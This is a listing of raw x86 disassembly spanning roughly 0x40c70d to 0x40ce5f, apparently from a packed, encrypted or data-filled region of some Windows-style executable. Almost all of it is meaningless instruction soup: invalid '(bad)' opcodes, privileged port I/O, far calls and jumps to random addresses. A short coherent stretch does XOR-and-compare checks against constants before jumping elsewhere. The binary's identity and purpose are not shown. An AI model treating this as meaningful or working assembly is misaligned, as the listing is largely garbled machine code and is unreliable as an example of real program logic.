  40c70d:	mov    DWORD PTR [ecx],eax
  40c70f:	push   edx
  40c710:	lahf   
  40c711:	or     ebx,esp
  40c713:	inc    ecx
  40c714:	retf   
  40c715:	out    0x2b,al
  40c717:	mov    DWORD PTR [ecx+0x2b],ecx
  40c71a:	lods   eax,DWORD PTR ds:[esi]
  40c71b:	xor    eax,eax
  40c71d:	bound  ebx,QWORD PTR [esi-0x66dd12c4]
  40c723:	xchg   esp,eax
  40c724:	pop    es
  40c725:	out    dx,eax
  40c726:	adc    BYTE PTR [edx+0x11c2ef52],bl
  40c72c:	pop    es
  40c72d:	adc    BYTE PTR [ecx-0x71],cl
  40c730:	enter  0x1581,0xa6
  40c734:	jo     0x40c6c5
  40c736:	or     edx,DWORD PTR [esi-0x29]
  40c739:	jo     0x40c706
  40c73b:	les    ebp,FWORD PTR [ebx+ebp*4+0x7ea7b68f]
  40c742:	out    dx,eax
  40c743:	mov    esp,0x25e7c9a
  40c748:	repz int3 
  40c74a:	cmp    eax,0xcf753b27
  40c74f:	jg     0x40c77d
  40c751:	div    BYTE PTR [edi]
  40c753:	mov    ch,0xfa
  40c755:	add    al,0xf4
  40c757:	xor    al,0xfd
  40c759:	sbb    DWORD PTR [ebx+0x423e9186],0xffffffde
  40c760:	jnp    0x40c70d
  40c762:	dec    ecx
  40c763:	adc    ah,BYTE PTR [edi+0x50]
  40c766:	sub    eax,0xa1413ca
  40c76b:	popa   
  40c76c:	pop    ss
  40c76d:	jb     0x40c749
  40c76f:	dec    eax
  40c770:	loop   0x40c7d5
  40c772:	aad    0x84
  40c774:	pop    ds
  40c775:	xor    eax,0xb30c49b7
  40c77a:	inc    eax
  40c77b:	mov    esi,0xeb5ad016
  40c780:	mov    bl,0xce
  40c782:	push   esi
  40c783:	cs pop eax
  40c785:	adc    BYTE PTR [edx],dh
  40c787:	not    cl
  40c789:	retf   0x2307
  40c78c:	das    
  40c78d:	inc    edx
  40c78e:	std    
  40c78f:	imul   ebx,ebp,0xa2bce02e
  40c795:	mov    eax,0x9a9f2b9b
  40c79a:	and    dh,BYTE PTR [edi+0x5f33e700]
  40c7a0:	ret    
  40c7a1:	out    0xcb,al
  40c7a3:	xchg   edx,eax
  40c7a4:	dec    eax
  40c7a5:	mov    edx,0xc9980b54
  40c7aa:	pushf  
  40c7ab:	push   ds
  40c7ac:	pop    esp
  40c7ad:	js     0x40c78a
  40c7af:	lds    esi,FWORD PTR [edi+0x28]
  40c7b2:	cmp    al,0xe
  40c7b4:	shl    cl,cl
  40c7b6:	pop    ecx
  40c7b7:	push   ss
  40c7b8:	mov    ah,0x1e
  40c7ba:	call   0x6ab3f9c1
  40c7bf:	fdiv   st,st(1)
  40c7c1:	cmp    cl,dh
  40c7c3:	add    bh,BYTE PTR [ecx-0x6fbdc3f7]
  40c7c9:	push   esp
  40c7ca:	or     edi,DWORD PTR [ebx+ebx*2]
  40c7cd:	sub    BYTE PTR [esi],dl
  40c7cf:	int3   
  40c7d0:	push   edx
  40c7d1:	cmp    dh,BYTE PTR [ebx+ecx*8+0x40914b6]
  40c7d8:	shl    DWORD PTR [ebp+0x7d79b479],cl
  40c7de:	jmp    0x40c842
  40c7e0:	std    
  40c7e1:	adc    al,0xe
  40c7e3:	inc    ecx
  40c7e4:	nop
  40c7e5:	add    ch,BYTE PTR [edi]
  40c7e7:	aam    0xee
  40c7e9:	mov    ds:0x57bbf7b9,al
  40c7ee:	pusha  
  40c7ef:	mov    al,ds:0xe1b23f
  40c7f4:	xor    al,0x66
  40c7f6:	arpl   ax,bp
  40c7f8:	sti    
  40c7f9:	jae    0x40c80a
  40c7fb:	jecxz  0x40c871
  40c7fd:	sub    BYTE PTR [esi-0x158fcaf5],bl
  40c803:	pop    ds
  40c804:	mov    esi,0xbe57be37
  40c809:	ss push edx
  40c80b:	xchg   ebx,eax
  40c80c:	inc    edx
  40c80d:	shl    DWORD PTR [esi+0x18],cl
  40c810:	mov    al,0x91
  40c812:	mov    edx,DWORD PTR [eax]
  40c814:	pop    ecx
  40c815:	mov    al,0xff
  40c817:	ins    BYTE PTR es:[edi],dx
  40c818:	enter  0x360d,0xd2
  40c81c:	dec    edx
  40c81d:	imul   ecx,DWORD PTR [ecx+0xe8d5f3],0x252b4185
  40c827:	and    eax,0x8ea50563
  40c82c:	enter  0xfaaa,0xa
  40c830:	mov    edx,0xc2c512e6
  40c835:	loope  0x40c8b5
  40c837:	(bad)  
  40c838:	out    0x72,al
  40c83a:	repz idiv BYTE PTR [edx-0x1d]
  40c83e:	push   ebx
  40c83f:	aaa    
  40c840:	stc    
  40c841:	fs or  esp,esi
  40c844:	test   BYTE PTR [ebp+0x15],0xf3
  40c848:	clc    
  40c849:	ror    esi,1
  40c84b:	inc    edi
  40c84c:	dec    ebp
  40c84d:	inc    eax
  40c84e:	mov    edi,DWORD PTR [edi-0x5d]
  40c851:	inc    ebp
  40c852:	push   0xffffffa1
  40c854:	scas   al,BYTE PTR es:[edi]
  40c855:	adc    bl,BYTE PTR [edx-0x24]
  40c858:	mov    bl,0xb3
  40c85a:	imul   ebp,DWORD PTR [ecx+esi*4],0x182d8250
  40c861:	ins    DWORD PTR es:[edi],dx
  40c862:	jg     0x40c884
  40c864:	mov    ch,ah
  40c866:	ficom  DWORD PTR [edx]
  40c868:	mov    edi,0xcaa7a37b
  40c86d:	xchg   edx,eax
  40c86e:	cdq    
  40c86f:	and    BYTE PTR [esi],ah
  40c871:	ret    0x631f
  40c874:	pushf  
  40c875:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c876:	mov    al,ds:0x4ab32b6b
  40c87b:	je     0x40c87d
  40c87d:	in     al,0x9a
  40c87f:	xor    BYTE PTR [eax-0x15],bl
  40c882:	xchg   edx,eax
  40c883:	outs   dx,DWORD PTR ds:[esi]
  40c884:	jnp    0x40c8cc
  40c886:	jo     0x40c873
  40c888:	xlat   BYTE PTR ds:[ebx]
  40c889:	and    ah,BYTE PTR [ebx]
  40c88b:	or     al,0x4c
  40c88d:	cmp    eax,0x4638f14e
  40c892:	pop    ss
  40c893:	mov    ds:0xd6e774fc,al
  40c898:	stc    
  40c899:	jo     0x40c8c7
  40c89b:	loop   0x40c899
  40c89d:	pop    edi
  40c89e:	(bad)
  40c8a2:	mov    esi,0x98fee56f
  40c8a7:	scas   al,BYTE PTR es:[edi]
  40c8a8:	cmp    dh,dl
  40c8aa:	ret    0x45c3
  40c8ad:	aas    
  40c8ae:	enter  0x83a6,0xcb
  40c8b2:	inc    eax
  40c8b3:	js     0x40c8db
  40c8b5:	mov    esp,0x7da8cd3e
  40c8ba:	and    bh,BYTE PTR [ecx]
  40c8bc:	jo     0x40c8e9
  40c8be:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c8bf:	leave  
  40c8c0:	iret   
  40c8c1:	ds dec ecx
  40c8c3:	adc    edx,esi
  40c8c5:	ja     0x40c855
  40c8c7:	fsub   DWORD PTR [esi+esi*1+0x1a]
  40c8cb:	sbb    ch,BYTE PTR [ecx+eax*1+0x69]
  40c8cf:	xchg   esi,eax
  40c8d0:	lds    ebx,FWORD PTR [ebp-0x7b]
  40c8d3:	sar    ebx,0x53
  40c8d6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c8d7:	test   edx,edx
  40c8d9:	sub    eax,0x8726911c
  40c8de:	(bad)  
  40c8df:	outs   dx,BYTE PTR ds:[esi]
  40c8e0:	lea    edx,[esi-0x78]
  40c8e3:	push   esp
  40c8e4:	fldenv [eax]
  40c8e6:	call   0xf59:0xa5266d67
  40c8ed:	fwait
  40c8ee:	sbb    ecx,DWORD PTR [edx]
  40c8f0:	sbb    DWORD PTR [eax-0x69],edi
  40c8f3:	mov    edx,0xc2e2109a
  40c8f8:	aaa    
  40c8f9:	(bad)  
  40c8fa:	adc    bh,BYTE PTR [ebx]
  40c8fc:	mov    ebp,0x462dbca4
  40c901:	sti    
  40c902:	nop
  40c903:	push   ss
  40c904:	mov    esi,DWORD PTR [ebp-0x268ab46]
  40c90a:	psraw  mm6,mm7
  40c90d:	dec    ebp
  40c90e:	dec    esp
  40c90f:	dec    esi
  40c910:	inc    ebx
  40c911:	xlat   BYTE PTR ds:[ebx]
  40c912:	push   eax
  40c913:	pop    ebp
  40c914:	cwde   
  40c915:	stos   BYTE PTR es:[edi],al
  40c916:	push   eax
  40c917:	jge    0x40c973
  40c919:	mov    edi,0x8be0458b
  40c91e:	push   ebp
  40c91f:	clc    
  40c920:	mov    edi,DWORD PTR [ebp-0x24]
  40c923:	xor    edx,ecx
  40c925:	add    edx,esi
  40c927:	imul   edx,edi
  40c92a:	sub    DWORD PTR [eax],edx
  40c92c:	mov    eax,DWORD PTR [ebp-0x14]
  40c92f:	jmp    0x40b5ea
  40c934:	mov    eax,DWORD PTR [ebp-0xc]
  40c937:	mov    edx,DWORD PTR [ebp-0x18]
  40c93a:	xor    eax,edx
  40c93c:	cmp    eax,0x7a0d5426
  40c941:	je     0x40b5e7
  40c947:	mov    eax,DWORD PTR [ebp-0x10]
  40c94a:	add    DWORD PTR [eax],0x7403502
  40c950:	jmp    0x40b5e7
  40c955:	mov    eax,DWORD PTR [ebp-0x1c]
  40c958:	jmp    0x40cc71
  40c95d:	rol    ebx,cl
  40c95f:	(bad)
  40c962:	leave  
  40c963:	rcr    ebx,1
  40c965:	mov    al,ds:0xf34c5e53
  40c96a:	mov    esi,eax
  40c96c:	xor    DWORD PTR [edx],0xffffff9d
  40c96f:	js     0x40c9e9
  40c971:	je     0x40c9f1
  40c973:	js     0x40c9ed
  40c975:	xchg   esi,eax
  40c976:	xor    esi,esi
  40c978:	fild   WORD PTR [edi]
  40c97a:	push   0x36
  40c97c:	pop    edx
  40c97d:	outs   dx,DWORD PTR ds:[esi]
  40c97e:	arpl   WORD PTR [ebx+0x1],di
  40c981:	add    dl,BYTE PTR [ebx-0x1c]
  40c984:	ins    DWORD PTR es:[edi],dx
  40c985:	xchg   ebx,eax
  40c986:	xchg   ebx,eax
  40c987:	mov    al,ds:0x5b5b4ae6
  40c98c:	and    edi,DWORD PTR [eax+0xa146732]
  40c992:	fadd   st,st(7)
  40c994:	lock out dx,eax
  40c996:	push   es
  40c997:	xchg   ebx,eax
  40c998:	jo     0x40c96f
  40c99a:	ins    BYTE PTR es:[edi],dx
  40c99b:	retf   0x4aa2
  40c99e:	dec    esi
  40c99f:	mov    dh,0x14
  40c9a1:	mov    ds:0xa53a900b,al
  40c9a6:	nop
  40c9a7:	nop
  40c9a8:	add    ebp,esp
  40c9aa:	idiv   BYTE PTR [edx]
  40c9ac:	push   ds
  40c9ad:	sub    ecx,DWORD PTR [eax-0x37]
  40c9b0:	cld    
  40c9b1:	adc    DWORD PTR [edx+0x54],ebp
  40c9b4:	mov    eax,ds:0xb162fd85
  40c9b9:	mov    bh,0x7f
  40c9bb:	push   ss
  40c9bc:	mov    edx,0x51d3c2ad
  40c9c1:	(bad)  [esp+ebx*4+0x77]
  40c9c5:	add    BYTE PTR [eax+0x0],ah
  40c9c8:	inc    esi
  40c9c9:	loope  0x40c988
  40c9cb:	xor    bl,ah
  40c9cd:	out    0x91,ax
  40c9d0:	cdq    
  40c9d1:	or     eax,0x73688111
  40c9d6:	dec    eax
  40c9d7:	inc    ebx
  40c9d8:	xor    al,0xb6
  40c9da:	in     al,0x9a
  40c9dc:	mov    ds:0xd390b66c,eax
  40c9e1:	mov    al,0xe6
  40c9e3:	inc    esp
  40c9e4:	pop    es
  40c9e5:	outs   dx,DWORD PTR ds:[esi]
  40c9e6:	or     BYTE PTR [edi-0x24],0x82
  40c9ea:	test   DWORD PTR [edx-0x34],edx
  40c9ed:	int3   
  40c9ee:	cdq    
  40c9ef:	or     BYTE PTR ds:0xb169aac0,dl
  40c9f5:	sbb    DWORD PTR [edx],edx
  40c9f7:	cmp    al,0xe
  40c9f9:	outs   dx,DWORD PTR ds:[esi]
  40c9fa:	loope  0x40c9f0
  40c9fc:	xchg   ebp,eax
  40c9fd:	rep outs dx,BYTE PTR ds:[esi]
  40c9ff:	jmp    0xfd5f:0x7503
  40ca05:	mov    bl,0xc7
  40ca07:	push   esp
  40ca08:	pop    eax
  40ca09:	xchg   ebp,eax
  40ca0a:	enter  0x8f80,0x99
  40ca0e:	inc    ebx
  40ca0f:	je     0x40c9be
  40ca11:	add    bh,BYTE PTR [ecx-0x62]
  40ca14:	mov    al,0xef
  40ca16:	jl     0x40ca00
  40ca18:	hlt    
  40ca19:	jmp    eax
  40ca1b:	adc    al,0x67
  40ca1d:	xchg   ebx,eax
  40ca1e:	iret   
  40ca1f:	mov    ch,0xf8
  40ca21:	hlt    
  40ca22:	retf   
  40ca23:	cwde   
  40ca24:	lods   eax,DWORD PTR ds:[esi]
  40ca25:	aaa    
  40ca26:	mov    DWORD PTR ds:0xae6e2459,ebx
  40ca2c:	(bad)  
  40ca2d:	inc    eax
  40ca2e:	dec    ecx
  40ca2f:	fmul   st,st(3)
  40ca31:	sbb    esi,ecx
  40ca33:	stos   BYTE PTR es:[edi],al
  40ca34:	test   DWORD PTR [edx+0x3b684c3e],ebp
  40ca3a:	xchg   edi,eax
  40ca3b:	data16 scas al,BYTE PTR es:[edi]
  40ca3d:	xor    dh,BYTE PTR [eax+eiz*4+0x21]
  40ca41:	enter  0x50ee,0x2f
  40ca45:	(bad)  
  40ca46:	and    al,0xf2
  40ca48:	mov    ds:0xebf79e22,eax
  40ca4d:	popa   
  40ca4e:	fwait
  40ca4f:	les    ecx,FWORD PTR [eax+0x2e34acf3]
  40ca55:	leave  
  40ca56:	adc    dh,BYTE PTR [ebx]
  40ca58:	pop    esp
  40ca59:	inc    edi
  40ca5a:	cmc    
  40ca5b:	jmp    0x40ca81
  40ca5d:	ja     0x40c9e1
  40ca5f:	sub    dh,BYTE PTR [edx*8+0x740b72b7]
  40ca66:	mov    edi,0x85eced3a
  40ca6b:	rol    BYTE PTR [esi-0xa],1
  40ca6e:	jmp    0xbc346bcc
  40ca73:	out    0x3a,al
  40ca75:	mov    ch,dl
  40ca77:	ret    
  40ca78:	adc    BYTE PTR [ebx],bl
  40ca7a:	fnsave [ebx+edx*8+0x0]
  40ca7e:	(bad)
  40ca81:	fld    QWORD PTR [esp+eax*4-0x19]
  40ca85:	and    al,BYTE PTR [ebx+0x5c]
  40ca88:	dec    ebp
  40ca89:	push   esp
  40ca8a:	icebp  
  40ca8b:	sbb    al,0x3b
  40ca8d:	adc    ebp,DWORD PTR [esi+0x6c]
  40ca90:	mov    ah,0x81
  40ca92:	scas   al,BYTE PTR es:[edi]
  40ca93:	pop    ss
  40ca94:	js     0x40ca5a
  40ca96:	mov    ds:0xde8080b9,eax
  40ca9b:	je     0x40ca78
  40ca9d:	out    dx,al
  40ca9e:	out    0xbf,eax
  40caa0:	mov    bl,0xdb
  40caa2:	mov    dh,BYTE PTR [edx]
  40caa4:	cmp    eax,0x20881708
  40caa9:	sub    DWORD PTR ds:0x7a883233,esp
  40caaf:	mov    WORD PTR [ebx+eax*8-0x3f],fs
  40cab3:	add    ah,cl
  40cab5:	add    edi,DWORD PTR [edx]
  40cab7:	cli    
  40cab8:	xlat   BYTE PTR ds:[ebx]
  40cab9:	push   eax
  40caba:	jp     0x40cae1
  40cabc:	fbld   TBYTE PTR [eax-0x698affdc]
  40cac2:	push   ebp
  40cac3:	imul   eax,esi,0x9585cc23
  40cac9:	mov    bl,0x93
  40cacb:	mov    bl,BYTE PTR [eax+eax*2+0x33c8ca6b]
  40cad2:	push   ds
  40cad3:	lock (bad) 
  40cad5:	sti    
  40cad6:	push   esi
  40cad7:	mul    DWORD PTR [edx+ebp*2-0x3c]
  40cadb:	pusha  
  40cadc:	or     al,0x8
  40cade:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cadf:	stos   DWORD PTR es:[edi],eax
  40cae0:	scas   eax,DWORD PTR es:[edi]
  40cae1:	jp     0x40ca9d
  40cae3:	xchg   DWORD PTR [esi+eax*4],ecx
  40cae6:	out    0x56,eax
  40cae8:	mov    esi,0xcd224fd7
  40caed:	shl    edx,1
  40caef:	pop    esp
  40caf0:	jecxz  0x40ca8d
  40caf2:	and    ebp,DWORD PTR [eax+edi*4-0x1]
  40caf6:	xor    dl,BYTE PTR [edi]
  40caf8:	sti    
  40caf9:	inc    DWORD PTR [ebp-0x32]
  40cafc:	dec    esp
  40cafd:	jmp    0x40caa3
  40caff:	into   
  40cb00:	jecxz  0x40cb10
  40cb02:	pop    ebx
  40cb03:	add    ch,BYTE PTR [edx+0x1e]
  40cb06:	inc    eax
  40cb07:	sub    dl,ch
  40cb09:	retf   0x246d
  40cb0c:	ss out 0xde,eax
  40cb0f:	inc    ecx
  40cb10:	lds    edx,FWORD PTR ds:0x7ad4558b
  40cb16:	mov    ecx,0xf0e53e46
  40cb1b:	shl    edx,1
  40cb1d:	cdq    
  40cb1e:	sti    
  40cb1f:	dec    esp
  40cb20:	es xchg ebp,eax
  40cb22:	xor    BYTE PTR [edx-0x45],0xea
  40cb26:	rol    BYTE PTR [esi-0x76],cl
  40cb29:	call   0x60c9:0xab63680f
  40cb30:	xor    BYTE PTR [ecx+0x18],cl
  40cb33:	test   al,0xb4
  40cb35:	jp     0x40cb72
  40cb37:	mov    BYTE PTR [edi+eax*1-0x3dd626f4],ah
  40cb3e:	or     ebx,edx
  40cb40:	out    dx,eax
  40cb41:	mov    eax,0x35a27b4b
  40cb46:	sahf   
  40cb47:	jmp    0x40cb95
  40cb49:	(bad)  
  40cb4a:	ins    BYTE PTR es:[edi],dx
  40cb4b:	jne    0x40cb11
  40cb4d:	cmp    al,0xf
  40cb4f:	pop    ebx
  40cb50:	mov    dh,0xcf
  40cb52:	mov    edi,0xf09176ac
  40cb57:	daa    
  40cb58:	(bad)  
  40cb59:	cld    
  40cb5a:	mov    ch,0x65
  40cb5c:	fsub   QWORD PTR [eax+ebx*8+0x6e]
  40cb60:	sbb    DWORD PTR [ebp+0xd4555c8],ecx
  40cb66:	mov    ss,WORD PTR [esi+0x2b764659]
  40cb6c:	cmp    al,0xe0
  40cb6e:	sub    al,0xff
  40cb70:	xor    BYTE PTR [ecx+0x68],0xac
  40cb74:	xor    esp,DWORD PTR [ecx+ecx*8-0x32]
  40cb78:	test   al,0xa1
  40cb7a:	jp     0x40cb15
  40cb7c:	dec    eax
  40cb7d:	cmp    ecx,DWORD PTR [ebx]
  40cb7f:	pop    esp
  40cb80:	jns    0x40cbaf
  40cb82:	mov    al,0xc3
  40cb84:	mov    ecx,0x511ffd43
  40cb89:	sub    BYTE PTR ds:0x9597b5b,ah
  40cb8f:	ret    
  40cb90:	repnz mov edx,0x841d823f
  40cb96:	xor    cl,ah
  40cb98:	or     eax,0x2a39bdac
  40cb9d:	mov    cl,0x89
  40cb9f:	inc    esp
  40cba0:	repz dec ecx
  40cba2:	cmp    cl,BYTE PTR [esi+0x268d3312]
  40cba8:	data16 in al,dx
  40cbaa:	mov    BYTE PTR [ebx-0x44],ah
  40cbad:	lods   al,BYTE PTR ds:[esi]
  40cbae:	mov    dl,0x1e
  40cbb0:	jbe    0x40cb3d
  40cbb2:	repz and BYTE PTR [eax+0x32b1ba82],0xb8
  40cbba:	xor    eax,0x96c92db5
  40cbbf:	scas   al,BYTE PTR es:[edi]
  40cbc0:	gs addr16 icebp 
  40cbc3:	out    0x63,al
  40cbc5:	mov    ebx,0x4b18959f
  40cbca:	jecxz  0x40cb93
  40cbcc:	lds    ebp,FWORD PTR [edx+0x27]
  40cbcf:	ficomp DWORD PTR [edx]
  40cbd1:	shl    DWORD PTR [eax+0x4360e230],1
  40cbd7:	fwait
  40cbd8:	xlat   BYTE PTR ds:[ebx]
  40cbd9:	xor    al,0x42
  40cbdb:	out    dx,eax
  40cbdc:	rcr    DWORD PTR [ecx],1
  40cbde:	sub    bl,BYTE PTR cs:[eax+esi*2]
  40cbe2:	and    edi,edx
  40cbe4:	imul   eax,DWORD PTR [edi-0x16a4bd3e],0x2e
  40cbeb:	push   ebx
  40cbec:	out    0x3b,al
  40cbee:	fadd   DWORD PTR [ebx]
  40cbf0:	mov    bl,0x7f
  40cbf2:	push   es
  40cbf3:	dec    esi
  40cbf4:	and    BYTE PTR [edx],0x14
  40cbf7:	je     0x40cba2
  40cbf9:	push   edi
  40cbfa:	jge    0x40cc6b
  40cbfc:	hlt    
  40cbfd:	sbb    esi,DWORD PTR [ebx+0x220b67f1]
  40cc03:	shl    DWORD PTR [edx+0x2efff372],0x65
  40cc0a:	jg     0x40cbd5
  40cc0c:	cmp    eax,0x66064efe
  40cc11:	inc    edx
  40cc12:	inc    edi
  40cc13:	std    
  40cc14:	repnz lahf 
  40cc16:	(bad)  
  40cc17:	stos   BYTE PTR es:[edi],al
  40cc18:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cc19:	sub    eax,0x7c882800
  40cc1e:	data16 (bad) 
  40cc20:	push   0x9490438e
  40cc25:	sbb    bh,BYTE PTR [ebx]
  40cc27:	pop    ss
  40cc28:	jecxz  0x40cc0e
  40cc2a:	adc    bl,bh
  40cc2c:	dec    eax
  40cc2d:	or     esi,edx
  40cc2f:	test   eax,0xca7acf87
  40cc34:	mov    esp,0x1007d499
  40cc39:	or     eax,DWORD PTR [edx-0x52]
  40cc3c:	in     al,0x91
  40cc3e:	push   ss
  40cc3f:	add    DWORD PTR [ecx-0x2e],0xffffffbc
  40cc43:	mov    ah,0x98
  40cc45:	jne    0x40cc97
  40cc47:	push   eax
  40cc48:	jp     0x40cbda
  40cc4a:	test   ah,0xbf
  40cc4d:	enter  0x7787,0x9
  40cc51:	mov    WORD PTR [ecx-0x3f],ds
  40cc54:	inc    eax
  40cc55:	or     BYTE PTR [eax-0x5d990bd0],ch
  40cc5b:	fild   WORD PTR [edx+eax*2+0x61]
  40cc5f:	cmp    cl,BYTE PTR [edi-0x64cde3a9]
  40cc65:	jne    0x40ccd0
  40cc67:	test   al,0x4c
  40cc69:	daa    
  40cc6a:	pop    eax
  40cc6c:	movsx  ebp,BYTE PTR [ebp+0x66]
  40cc70:	in     eax,dx
  40cc71:	cmp    DWORD PTR [eax],edi
  40cc73:	jmp    0x40cf8c
  40cc78:	(bad)  
  40cc79:	(bad)  
  40cc7a:	rol    esp,1
  40cc7c:	ror    ebx,1
  40cc7e:	aad    0xda
  40cc80:	xchg   esi,eax
  40cc81:	mov    dl,0x71
  40cc83:	aad    0x82
  40cc85:	imul   DWORD PTR [ebx+ebx*2+0x2e]
  40cc89:	mov    ds:0x7e747878,al
  40cc8e:	js     0x40cd08
  40cc90:	imul   edx,DWORD PTR ds:[esp+eax*8+0xa],0x22
  40cc96:	retf   0x2db4
  40cc99:	rcl    BYTE PTR [eax+ecx*2-0x7b],1
  40cc9d:	cmp    eax,0xc49356a1
  40cca2:	xchg   esp,eax
  40cca3:	mov    dh,0x1a
  40cca5:	test   eax,0xf0fc7569
  40ccaa:	add    ch,dl
  40ccac:	xor    ebx,DWORD PTR [ebp+edi*1+0x208c0353]
  40ccb3:	mov    dh,0xb3
  40ccb5:	out    0xd2,eax
  40ccb7:	rcl    DWORD PTR [ecx],cl
  40ccb9:	stc    
  40ccba:	adc    BYTE PTR [edi-0x75],ch
  40ccbd:	icebp  
  40ccbe:	dec    esp
  40ccbf:	sub    BYTE PTR ds:0x4ce90ab8,al
  40ccc5:	cmp    eax,0x86d2a382
  40ccca:	mov    al,ds:0xd68fed61
  40cccf:	scas   eax,DWORD PTR es:[edi]
  40ccd0:	sub    BYTE PTR [esi+0x38],cl
  40ccd3:	adc    edx,DWORD PTR [edx+eax*8+0x12]
  40ccd7:	je     0x40cd2e
  40ccd9:	loop   0x40cc75
  40ccdb:	imul   esi,DWORD PTR [edx+ebp*2+0x75],0x4d5ad1b8
  40cce3:	lahf   
  40cce4:	cmc    
  40cce5:	sbb    edx,0xfffffff4
  40cce8:	or     BYTE PTR [esi-0x66],dl
  40cceb:	sub    DWORD PTR fs:[esp+ebx*2-0x76],esp
  40ccf0:	jl     0x40cd08
  40ccf2:	mov    ecx,0x5e3b1c80
  40ccf7:	sti    
  40ccf8:	xchg   esp,eax
  40ccf9:	mov    DWORD PTR [ecx],esp
  40ccfb:	adc    ch,bh
  40ccfd:	lods   eax,DWORD PTR ds:[esi]
  40ccfe:	mov    eax,ds:0x9ba0ee0a
  40cd03:	mov    bh,0x9b
  40cd05:	ds jmp 0xca1:0x8fab9b52
  40cd0d:	xchg   ebx,eax
  40cd0e:	or     BYTE PTR [ecx-0x27bcbe8],bh
  40cd14:	xchg   ebx,eax
  40cd15:	in     eax,dx
  40cd16:	xchg   DWORD PTR [eax+0x7c],edx
  40cd19:	xlat   BYTE PTR ds:[ebx]
  40cd1a:	push   eax
  40cd1b:	mov    ds:0xcf919c8d,eax
  40cd20:	xchg   DWORD PTR [ebp+0x39d59968],esi
  40cd26:	dec    edx
  40cd27:	clc    
  40cd28:	xchg   BYTE PTR [eax],bh
  40cd2a:	jmp    0x4dc8a07f
  40cd2f:	aas    
  40cd30:	cli    
  40cd31:	push   cs
  40cd32:	fbstp  TBYTE PTR [edi+0x1b24d061]
  40cd38:	jb     0x40ccdd
  40cd3a:	cmp    DWORD PTR [edx-0x269b412],eax
  40cd40:	test   DWORD PTR [edx],0xa81a6530
  40cd46:	add    BYTE PTR [edx+0x2d],cl
  40cd49:	into   
  40cd4a:	or     ebp,edx
  40cd4c:	mov    edi,0xddc9ad4d
  40cd51:	ret    0x1a7d
  40cd54:	retf   0xb1de
  40cd57:	jmp    0x40cd0c
  40cd59:	and    BYTE PTR [esi-0x2f],cl
  40cd5c:	(bad)  
  40cd5d:	or     BYTE PTR [ecx+0x1f],cl
  40cd60:	fidivr DWORD PTR [ebx-0x3ab634d7]
  40cd66:	cmp    ebx,DWORD PTR [ebp-0x2c49acfa]
  40cd6c:	imul   esi,DWORD PTR [ebx],0x54a58758
  40cd72:	xor    ch,bl
  40cd74:	mov    dl,0x2d
  40cd76:	lods   eax,DWORD PTR ds:[esi]
  40cd77:	cwde   
  40cd78:	and    DWORD PTR [ebx-0x3b],edx
  40cd7b:	fsub   st,st(7)
  40cd7d:	call   0x1e60:0xfc40b524
  40cd84:	xor    BYTE PTR [edi],bh
  40cd86:	jne    0x40cd1c
  40cd88:	ror    BYTE PTR [edx],0x2a
  40cd8b:	cli    
  40cd8c:	lods   eax,DWORD PTR ds:[esi]
  40cd8d:	and    al,0xd3
  40cd8f:	xor    BYTE PTR [ebx+0x61],ah
  40cd92:	sbb    al,0xc5
  40cd94:	sbb    eax,0x8abd4c54
  40cd99:	jge    0x40cdc9
  40cd9b:	cs cmp eax,0xc545d948
  40cda1:	lods   al,BYTE PTR ds:[esi]
  40cda2:	repz cmp eax,0x3b74130e
  40cda8:	mov    ch,0x8e
  40cdaa:	call   0x7ed0746a
  40cdaf:	xlat   BYTE PTR fs:[ebx]
  40cdb1:	mov    ebp,0x914b0d9f
  40cdb6:	ror    BYTE PTR [edx+0x3],0x95
  40cdba:	gs jmp 0x9222e129
  40cdc0:	rol    BYTE PTR [ecx],0x17
  40cdc3:	cli    
  40cdc4:	sbb    BYTE PTR [edi+0x9a7413b],dh
  40cdca:	jbe    0x40ce02
  40cdcc:	inc    edx
  40cdcd:	daa    
  40cdce:	das    
  40cdcf:	cmp    al,0x3e
  40cdd1:	dec    DWORD PTR [ecx]
  40cdd3:	iret   
  40cdd4:	pop    ebp
  40cdd5:	adc    al,0xd2
  40cdd7:	outs   dx,BYTE PTR ds:[esi]
  40cdd8:	gs out dx,al
  40cdda:	dec    BYTE PTR [esi+0x23]
  40cddd:	gs test eax,0xcea26ac9
  40cde3:	mov    ah,0x49
  40cde5:	les    ebx,FWORD PTR [edi+eax*1]
  40cde8:	ret    
  40cde9:	je     0x40ce35
  40cdeb:	(bad)  
  40cded:	out    dx,al
  40cdee:	inc    ebp
  40cdef:	fiadd  WORD PTR [edx+edx*2-0x28417af6]
  40cdf6:	inc    ebx
  40cdf7:	jecxz  0x40ce03
  40cdf9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cdfa:	fidivr DWORD PTR [edi-0x337ea4ec]
  40ce00:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ce01:	leave  
  40ce02:	out    0x7f,al
  40ce04:	jo     0x40cd9a
  40ce06:	add    ah,BYTE PTR [ecx+edx*4+0x2e]
  40ce0a:	sub    edx,edx
  40ce0c:	div    DWORD PTR [eax+0x4b779613]
  40ce12:	fnstsw WORD PTR ds:0x6e7ed198
  40ce18:	popa   
  40ce19:	popf   
  40ce1a:	xor    ah,BYTE PTR [edx]
  40ce1c:	xchg   al,ch
  40ce1e:	pop    ecx
  40ce1f:	or     edx,DWORD PTR [esi]
  40ce21:	xchg   edi,eax
  40ce22:	inc    esp
  40ce23:	sbb    BYTE PTR [edx+0x38],bl
  40ce26:	sub    ebx,ecx
  40ce28:	jns    0x40ce9f
  40ce2a:	add    eax,0x27db7283
  40ce2f:	or     BYTE PTR [ebp-0x6a5572f4],0x69
  40ce36:	jns    0x40ce12
  40ce38:	add    al,0x8b
  40ce3a:	in     eax,0xa8
  40ce3c:	pop    ds
  40ce3d:	gs scas eax,DWORD PTR es:[edi]
  40ce3f:	push   es
  40ce40:	gs loopne 0x40ce0c
  40ce43:	es xchg ebx,eax
  40ce45:	xor    DWORD PTR [esi-0x29],ebx
  40ce48:	mov    esi,0xe862f552
  40ce4d:	daa    
  40ce4e:	xor    DWORD PTR [ecx+0x2f4126ec],ebx
  40ce54:	push   ds
  40ce55:	xor    bh,BYTE PTR [eax+0x10]
  40ce58:	test   DWORD PTR [edx],0x21ba724f
  40ce5e:	dec    ecx
  40ce5f:	in     eax,dx
